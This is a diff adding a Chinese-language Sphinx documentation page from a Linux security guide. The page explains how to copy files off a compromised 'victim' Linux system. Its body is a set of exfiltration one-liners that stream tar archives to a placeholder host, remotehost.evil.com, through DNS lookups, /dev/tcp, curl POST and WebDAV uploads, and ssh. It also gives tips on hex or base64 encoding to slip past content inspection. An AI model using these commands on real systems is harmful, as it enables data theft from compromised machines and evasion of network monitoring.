@@ -1,0 +1,135 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    
+    <title>download &mdash; Linux 1.0 文档</title>
+    
+    <link rel="stylesheet" href="../_static/default.css" type="text/css" />
+    <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+    
+    <script type="text/javascript">
+      var DOCUMENTATION_OPTIONS = {
+        URL_ROOT:    '../',
+        VERSION:     '1.0',
+        COLLAPSE_INDEX: false,
+        FILE_SUFFIX: '.html',
+        HAS_SOURCE:  true
+      };
+    </script>
+    <script type="text/javascript" src="../_static/jquery.js"></script>
+    <script type="text/javascript" src="../_static/underscore.js"></script>
+    <script type="text/javascript" src="../_static/doctools.js"></script>
+    <script type="text/javascript" src="../_static/translations.js"></script>
+    <link rel="top" title="Linux 1.0 文档" href="../index.html" />
+    <link rel="up" title="Linux 安全" href="index.html" />
+    <link rel="next" title="Linux 安全加固思路" href="Security_Hardening.html" />
+    <link rel="prev" title="common ports" href="ports.html" /> 
+  </head>
+  <body>
+    <div class="related">
+      <h3>导航</h3>
+      <ul>
+        <li class="right" style="margin-right: 10px">
+          <a href="../genindex.html" title="总目录"
+             accesskey="I">索引</a></li>
+        <li class="right" >
+          <a href="Security_Hardening.html" title="Linux 安全加固思路"
+             accesskey="N">下一页</a> |</li>
+        <li class="right" >
+          <a href="ports.html" title="common ports"
+             accesskey="P">上一页</a> |</li>
+        <li><a href="../index.html">Linux 1.0 文档</a> &raquo;</li>
+          <li><a href="index.html" accesskey="U">Linux 安全</a> &raquo;</li> 
+      </ul>
+    </div>  
+
+    <div class="document">
+      <div class="documentwrapper">
+        <div class="bodywrapper">
+          <div class="body">
+            
+  <div class="section" id="download">
+<h1>download<a class="headerlink" href="#download" title="永久链接至标题">¶</a></h1>
+<p>渗透到一个Linux 系统，想要下载victim上的文件，可以参考一下方法</p>
+<p><strong>1、通过DNS传输数据</strong></p>
+<p>tar zcf - localfolder | xxd -p -c 16 | while read line; do host $line.domain.com remotehost.evil.com; done</p>
+<p>把打包后的数据用16进制编码，每行16字节，这样在通过dns发送到时候就不会因为超长导致出错。然后我们限制每次只发送1个ping数据包，减少发送时间。至于怎么还原，那就要看你的了。
+需要DNS服务器端 抓包过滤出需要的数据</p>
+<p><strong>2、通过tcp发送</strong></p>
+<p>tar zcf - localfolder &gt;/dev/tcp/remotehost.evil.com/443</p>
+<p>大家看这个方式是不是有点眼熟？没错，就是和弹shell的方法差不多，只不过这次我们用来传送文件。</p>
+<p>效果和用nc传文件是一样的。假如远程服务器和网络还有内容检测的话，我们还可以对文件进行一些编码来混淆，比如用xxd命令转换成16进制 dump</p>
+<p>tar zcf - localfolder | xxd -p &gt;/dev/tcp/remotehost.evil.com/443</p>
+<p>本地服务器可以用xxd -r来还原源文件，其实除了xxd，用 base64也不错，就是有点明显……</p>
+<p><strong>3、通过curl POST 提交</strong></p>
+<p>tar zcf - localfolder | curl -F &#8220;data=&#64;-&#8221; <a class="reference external" href="https://remotehost.evil.com/script.php">https://remotehost.evil.com/script.php</a></p>
+<p>curl -F 表示通过伪表单用Post方式发送数据</p>
+<p>当然，你还要在本地建一个script.php用来收取数据然后写入到文件才行，并且web服务器要支持ssl并且有https证书。</p>
+<p>或者通过webdav上传(前提是上传的目录支持webdav)</p>
+<p>curl -T localfile <a class="reference external" href="http://remotehost.evil.com/">http://remotehost.evil.com/</a></p>
+<p>不过curl在很多linux发行版里面都没有默认安装，所以还是有时候还是不太靠谱。</p>
+<p><strong>4、通过ssh通道传输数据</strong></p>
+<p>一边tar一边通过ssh传到服务器并且自动解压缩，最后会得到远程服务器上文件夹的一份完美备份，并且在目标服务器上不会写入任何文件。</p>
+<p>tar zcf - /some/localfolder | ssh remotehost.evil.com &#8220;cd /some/path/name; tar zxpf -&#8220;</p>
+</div>
+
+
+          </div>
+        </div>
+      </div>
+      <div class="sphinxsidebar">
+        <div class="sphinxsidebarwrapper">
+  <h4>上一个主题</h4>
+  <p class="topless"><a href="ports.html"
+                        title="上一章">common ports</a></p>
+  <h4>下一个主题</h4>
+  <p class="topless"><a href="Security_Hardening.html"
+                        title="下一章">Linux 安全加固思路</a></p>
+  <h3>本页</h3>
+  <ul class="this-page-menu">
+    <li><a href="../_sources/Linux_security/download.txt"
+           rel="nofollow">显示源代码</a></li>
+  </ul>
+<div id="searchbox" style="display: none">
+  <h3>快速搜索</h3>
+    <form class="search" action="../search.html" method="get">
+      <input type="text" name="q" />
+      <input type="submit" value="转向" />
+      <input type="hidden" name="check_keywords" value="yes" />
+      <input type="hidden" name="area" value="default" />
+    </form>
+    <p class="searchtip" style="font-size: 90%">
+    输入相关的术语，模块，类或者函数名称进行搜索
+    </p>
+</div>
+<script type="text/javascript">$('#searchbox').show(0);</script>
+        </div>
+      </div>
+      <div class="clearer"></div>
+    </div>
+    <div class="related">
+      <h3>导航</h3>
+      <ul>
+        <li class="right" style="margin-right: 10px">
+          <a href="../genindex.html" title="总目录"
+             >索引</a></li>
+        <li class="right" >
+          <a href="Security_Hardening.html" title="Linux 安全加固思路"
+             >下一页</a> |</li>
+        <li class="right" >
+          <a href="ports.html" title="common ports"
+             >上一页</a> |</li>
+        <li><a href="../index.html">Linux 1.0 文档</a> &raquo;</li>
+          <li><a href="index.html" >Linux 安全</a> &raquo;</li> 
+      </ul>
+    </div>
+    <div class="footer">
+        &copy; 版权所有 2015, wenjian.
+      由 <a href="http://sphinx-doc.org/">Sphinx</a> 1.2.3 创建。
+    </div>
+  </body>
+</html>
